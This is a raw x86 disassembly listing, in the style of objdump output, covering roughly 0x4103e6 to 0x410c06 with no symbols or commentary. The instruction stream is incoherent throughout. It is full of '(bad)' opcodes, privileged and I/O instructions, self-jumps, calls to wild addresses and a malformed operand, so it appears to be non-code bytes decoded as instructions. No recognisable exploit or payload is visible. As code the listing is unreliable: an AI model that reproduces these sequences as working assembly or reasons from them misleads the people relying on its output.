  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
